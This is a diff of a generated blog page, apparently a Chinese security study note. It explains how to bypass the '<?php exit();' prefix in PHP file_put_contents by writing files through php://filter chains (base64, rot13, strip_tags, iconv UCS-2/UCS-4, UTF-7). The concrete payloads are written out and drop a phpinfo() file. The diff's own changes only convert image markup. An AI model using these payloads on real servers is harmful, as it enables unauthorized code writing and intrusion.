@@ -292,19 +292,19 @@
 <h2 id="Base64编码"><a href="#Base64编码" class="headerlink" title="Base64编码"></a>Base64编码</h2><p>最常用的就是base64编码，通过解码把<code>&lt;?php exit();</code>解码为乱码，而后面我们传入的webshell的base64内容被正常解码，就可以直接干掉<code>&lt;?php exit();</code>得到一个shell了,不过由于<code>&lt;?php exit();</code>中只有phpexit参与了解码，由于base64解码时4转3,所以需要补一位</p>
 <pre><code class="php">$content = &lt;?php phpinfo();?&gt; 👉 PD9waHAgcGhwaW5mbygpOz8+ 👉 aPD9waHAgcGhwaW5mbygpOz8+
 $filename = php://filter/write=convert.base64-decode/resource=geekcat.php</code></pre>
-<p>![截屏2020-08-12 下午9.19.26](学习关于file-put-contents死亡退出的绕过/截屏2020-08-12 下午9.19.26.png)</p>
-<p>![截屏2020-08-12 下午9.19.59](学习关于file-put-contents死亡退出的绕过/截屏2020-08-12 下午9.19.59.png)</p>
+<p><img src="%E5%AD%A6%E4%B9%A0%E5%85%B3%E4%BA%8Efile-put-contents%E6%AD%BB%E4%BA%A1%E9%80%80%E5%87%BA%E7%9A%84%E7%BB%95%E8%BF%87/%E6%88%AA%E5%B1%8F2020-08-12%20%E4%B8%8B%E5%8D%889.19.26.png" alt="截屏2020-08-12 下午9.19.26"></p>
+<p><img src="%E5%AD%A6%E4%B9%A0%E5%85%B3%E4%BA%8Efile-put-contents%E6%AD%BB%E4%BA%A1%E9%80%80%E5%87%BA%E7%9A%84%E7%BB%95%E8%BF%87/%E6%88%AA%E5%B1%8F2020-08-12%20%E4%B8%8B%E5%8D%889.19.59.png" alt="截屏2020-08-12 下午9.19.59"></p>
 <h2 id="Rot13编码"><a href="#Rot13编码" class="headerlink" title="Rot13编码"></a>Rot13编码</h2><pre><code class="php">$content = &lt;?php phpinfo();?&gt; 👉 &lt;?cuc cucvasb();?&gt;
 $filename = php://filter/write=string.rot13/resource=geekcat.php</code></pre>
-<p>![截屏2020-08-12 下午9.23.24](学习关于file-put-contents死亡退出的绕过/截屏2020-08-12 下午9.23.24.png)</p>
-<p>![截屏2020-08-12 下午9.23.03](学习关于file-put-contents死亡退出的绕过/截屏2020-08-12 下午9.23.03.png)</p>
+<p><img src="%E5%AD%A6%E4%B9%A0%E5%85%B3%E4%BA%8Efile-put-contents%E6%AD%BB%E4%BA%A1%E9%80%80%E5%87%BA%E7%9A%84%E7%BB%95%E8%BF%87/%E6%88%AA%E5%B1%8F2020-08-12%20%E4%B8%8B%E5%8D%889.23.24.png" alt="截屏2020-08-12 下午9.23.24"></p>
+<p><img src="%E5%AD%A6%E4%B9%A0%E5%85%B3%E4%BA%8Efile-put-contents%E6%AD%BB%E4%BA%A1%E9%80%80%E5%87%BA%E7%9A%84%E7%BB%95%E8%BF%87/%E6%88%AA%E5%B1%8F2020-08-12%20%E4%B8%8B%E5%8D%889.23.03.png" alt="截屏2020-08-12 下午9.23.03"></p>
 <p>这种方法是需要服务器<strong>没有开启短标签</strong>的时候才可以使用(默认情况是没开启: <strong>php.ini</strong>中的<code>short_open_tag</code>)</p>
 <h2 id="组合拳"><a href="#组合拳" class="headerlink" title="组合拳"></a>组合拳</h2><p>可以利用<code>php://filter</code>字符串处理方法组合编码的方法绕过<code>&lt;?php exit();</code>，相对于直接编码就有点多此一举了，不过知道有这个方法就好，例如利用<code>strip_tags</code>方法来<strong>直接去除xml</strong>，而我们传入的shell经过base64编码，所以不会被去除，再解码即可，<code>php://filter</code>支持使用多个过滤器</p>
 <pre><code class="php">$content = &lt;?php phpinfo();?&gt; 👉 PD9waHAgcGhwaW5mbygpOz8+ 👉 ?&gt;PD9waHAgcGhwaW5mbygpOz8+ #&lt;?php exit();不是完整的标签所以需要补全?&gt;
 $filename = php://filter/write=string.strip_tags|convert.base64-decode/resource=geekcat.php  </code></pre>
 <p>先去除xml标签之后再进行base64解码</p>
-<p>![截屏2020-08-12 下午9.38.35](学习关于file-put-contents死亡退出的绕过/截屏2020-08-12 下午9.38.35.png)</p>
-<p>![截屏2020-08-12 下午9.37.07](学习关于file-put-contents死亡退出的绕过/截屏2020-08-12 下午9.37.07.png)</p>
+<p><img src="%E5%AD%A6%E4%B9%A0%E5%85%B3%E4%BA%8Efile-put-contents%E6%AD%BB%E4%BA%A1%E9%80%80%E5%87%BA%E7%9A%84%E7%BB%95%E8%BF%87/%E6%88%AA%E5%B1%8F2020-08-12%20%E4%B8%8B%E5%8D%889.38.35.png" alt="截屏2020-08-12 下午9.38.35"></p>
+<p><img src="%E5%AD%A6%E4%B9%A0%E5%85%B3%E4%BA%8Efile-put-contents%E6%AD%BB%E4%BA%A1%E9%80%80%E5%87%BA%E7%9A%84%E7%BB%95%E8%BF%87/%E6%88%AA%E5%B1%8F2020-08-12%20%E4%B8%8B%E5%8D%889.37.07.png" alt="截屏2020-08-12 下午9.37.07"></p>
 <h1 id="file-put-contents-a-”-lt-php-exit-”-a"><a href="#file-put-contents-a-”-lt-php-exit-”-a" class="headerlink" title="file_put_contents($a,”&lt;?php exit();”.$a);"></a>file_put_contents($a,”&lt;?php exit();”.$a);</h1><p>此时仅有一个变量，原理相同</p>
 <h2 id="Base64编码-1"><a href="#Base64编码-1" class="headerlink" title="Base64编码"></a>Base64编码</h2><p>同样利用<code>php://filter</code>来构造，反正后面是写入的内容，只要在后面解码的时候把shell解码出来，不需要的东西解码成乱码即可</p>
 <pre><code class="php">$a = php://filter/write=convert.base64-decode|PD9waHAgcGhwaW5mbygpOz8+|/resource=geekcat.php</code></pre>
@@ -314,14 +314,14 @@ $filename = php://filter/write=string.strip_tags|convert.base64-decode/resource=
 <p>默认情况下base64编码是以 <code>=</code> 作为结尾，<strong>正常解码的时候到了 <code>=</code> 就解码结束</strong>，即使我们构造payload的时候不用<code>write=</code>，但是在最后获取文件名的时候<code>resource=</code>中的 <code>=</code> 也过不掉，所以导致过滤器解码失败，从而报错(不过还是会创建文件)</p>
 <p><strong>此方法目前暂不可行</strong></p>
 <h2 id="Rot13编码-1"><a href="#Rot13编码-1" class="headerlink" title="Rot13编码"></a>Rot13编码</h2><pre><code class="php">$a = php://filter/write=string.rot13|&lt;?cuc cucvasb();?&gt;|/resource=geekcat.php</code></pre>
-<p>![截屏2020-08-12 下午10.01.47](学习关于file-put-contents死亡退出的绕过/截屏2020-08-12 下午10.01.47.png)</p>
+<p><img src="%E5%AD%A6%E4%B9%A0%E5%85%B3%E4%BA%8Efile-put-contents%E6%AD%BB%E4%BA%A1%E9%80%80%E5%87%BA%E7%9A%84%E7%BB%95%E8%BF%87/%E6%88%AA%E5%B1%8F2020-08-12%20%E4%B8%8B%E5%8D%8810.01.47.png" alt="截屏2020-08-12 下午10.01.47"></p>
 <p>这种方法是需要服务器<strong>没有开启短标签</strong>的时候才可以使用，Linux环境默认不开启<code>short_open_tag</code></p>
 <h2 id="iconv字符编码转换"><a href="#iconv字符编码转换" class="headerlink" title="iconv字符编码转换"></a>iconv字符编码转换</h2><p>iconv — 字符串按要求的字符编码转换</p>
 <p>将字符串<code>str</code>从<code>in_charset</code>转换编码到<code>out_charset</code></p>
 <pre><code class="php">iconv ( string $in_charset , string $out_charset , string $str ) : string</code></pre>
 <p>通过字符转换把<code>&lt;?php exit();</code>转成不能解析的字符串，👇采用的是UCS-2或者UCS-4编码方式</p>
-<p>![截屏2020-08-12 下午10.22.23](学习关于file-put-contents死亡退出的绕过/截屏2020-08-12 下午10.22.23.png)</p>
-<p>![截屏2020-08-12 下午10.22.42](学习关于file-put-contents死亡退出的绕过/截屏2020-08-12 下午10.22.42.png)</p>
+<p><img src="%E5%AD%A6%E4%B9%A0%E5%85%B3%E4%BA%8Efile-put-contents%E6%AD%BB%E4%BA%A1%E9%80%80%E5%87%BA%E7%9A%84%E7%BB%95%E8%BF%87/%E6%88%AA%E5%B1%8F2020-08-12%20%E4%B8%8B%E5%8D%8810.22.23.png" alt="截屏2020-08-12 下午10.22.23"></p>
+<p><img src="%E5%AD%A6%E4%B9%A0%E5%85%B3%E4%BA%8Efile-put-contents%E6%AD%BB%E4%BA%A1%E9%80%80%E5%87%BA%E7%9A%84%E7%BB%95%E8%BF%87/%E6%88%AA%E5%B1%8F2020-08-12%20%E4%B8%8B%E5%8D%8810.22.42.png" alt="截屏2020-08-12 下午10.22.42"></p>
 <p>通过UCS-2或者UCS-4的方式，对目标字符串进行2/4位反转，构造需要数据是<strong>UCS-2或UCS-4中2或者4的倍数，不然不能反转</strong>，利用这种过滤器进行编码转换绕过</p>
 <pre><code class="php">$a = &#39;php://filter//convert.iconv.UCS-2LE.UCS-2BE|?&lt;hp phpipfn(o;)&gt;?/resource=geekcat.php&#39;;
 
@@ -329,8 +329,8 @@ $a = &#39;php://filter//convert.iconv.UCS-4LE.UCS-4BE|xxx?&lt;aa phpiphp(ofn&gt;
 # UCS-4为4位一反转，所以在与&lt;?php exit(); 拼接时要xxx👆</code></pre>
 <h2 id="组合拳-1"><a href="#组合拳-1" class="headerlink" title="组合拳"></a>组合拳</h2><h3 id="第一套连招"><a href="#第一套连招" class="headerlink" title="第一套连招"></a>第一套连招</h3><pre><code class="php">$a = &#39;php://filter/write=convert.iconv.UCS-2LE.UCS-2BE|string.rot13|x?&lt;uc cucvcsa(b;)&gt;?/resource=Cyc1e.php&#39;; </code></pre>
 <h3 id="第二套连招"><a href="#第二套连招" class="headerlink" title="第二套连招"></a>第二套连招</h3><p>单独用base64编码是不可行的，但组合拳可行，通过iconv将utf8编码转为utf7编码，从而转换<code>=</code> ，就不会影响到base64的解码</p>
-<p>![截屏2020-08-12 下午10.42.26](学习关于file-put-contents死亡退出的绕过/截屏2020-08-12 下午10.42.26.png)</p>
-<p>![截屏2020-08-12 下午10.43.23](学习关于file-put-contents死亡退出的绕过/截屏2020-08-12 下午10.43.23.png)</p>
+<p><img src="%E5%AD%A6%E4%B9%A0%E5%85%B3%E4%BA%8Efile-put-contents%E6%AD%BB%E4%BA%A1%E9%80%80%E5%87%BA%E7%9A%84%E7%BB%95%E8%BF%87/%E6%88%AA%E5%B1%8F2020-08-12%20%E4%B8%8B%E5%8D%8810.42.26.png" alt="截屏2020-08-12 下午10.42.26"></p>
+<p><img src="%E5%AD%A6%E4%B9%A0%E5%85%B3%E4%BA%8Efile-put-contents%E6%AD%BB%E4%BA%A1%E9%80%80%E5%87%BA%E7%9A%84%E7%BB%95%E8%BF%87/%E6%88%AA%E5%B1%8F2020-08-12%20%E4%B8%8B%E5%8D%8810.43.23.png" alt="截屏2020-08-12 下午10.43.23"></p>
 <h3 id="第三套连招"><a href="#第三套连招" class="headerlink" title="第三套连招"></a>第三套连招</h3><p>用strip_tags方法&amp;&amp;base64的组合，因为strip_tags去除的是完整的标签以及内容，而base64要求中间不能出现 <code>=</code> 所以把二者组合</p>
 <pre><code class="php">$a = &#39;php://filter/write=string.strip_tags|convert.base64-decode/resource=?&gt;PD9waHAgcGhwaW5mbygpOz8+.php&#39;;</code></pre>
 <p>文件名前加上<code>?&gt;</code>把<code>&lt;?php exit();</code>闭合，同时<code>=</code>也在闭合标签之间，利用strip_tags直接把<code>&lt;?php ...... ?&gt;</code>内的所有内容删除，然后对剩下的部分进行base64解码</p>
